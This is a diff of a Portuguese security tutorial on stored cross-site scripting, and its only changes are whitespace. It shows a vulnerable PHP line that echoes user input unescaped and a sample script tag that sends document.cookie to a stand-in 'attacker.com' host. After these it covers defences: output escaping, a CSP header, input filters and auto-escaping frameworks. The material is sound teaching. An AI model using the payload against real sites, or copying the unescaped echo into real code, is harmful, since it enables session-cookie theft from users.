@@ -42,12 +42,14 @@ Esse código é executado **no navegador da vítima**, com os **mesmos privilég
 ## ⚠️ Exemplo real de XSS Armazenado (em PHP puro)
 
 ### PHP com falha:
+
 ```php
 // exibir_comentario.php
 echo $_POST['comentario'];
 ```
 
 ### Usuário malicioso envia:
+
 ```html
 <script>fetch('https://attacker.com/log?cookie=' + document.cookie)</script>
 ```
@@ -59,6 +61,7 @@ O navegador da vítima executa o script e envia seu cookie de sessão ao invasor
 ## 🔒 Como se proteger de XSS
 
 ### 1. **Escape de saída (output)**
+
 Sempre que mostrar dados do usuário:
 
 #### PHP:
@@ -77,6 +80,7 @@ echo htmlspecialchars($comentario, ENT_QUOTES, 'UTF-8');
 ---
 
 ### 2. **Content Security Policy (CSP)**
+
 Bloqueia execução de scripts não autorizados.
 
 ```http
@@ -86,11 +90,13 @@ Content-Security-Policy: default-src 'self';
 ---
 
 ### 3. **Filtros de input (não são suficientes sozinhos)**
+
 Ex: bloquear `<script>`, `onerror`, `javascript:`
 
 ---
 
 ### 4. **Use frameworks que escapam por padrão**
+
 Laravel, Django, Rails... escapam automaticamente no template.
 
 ---
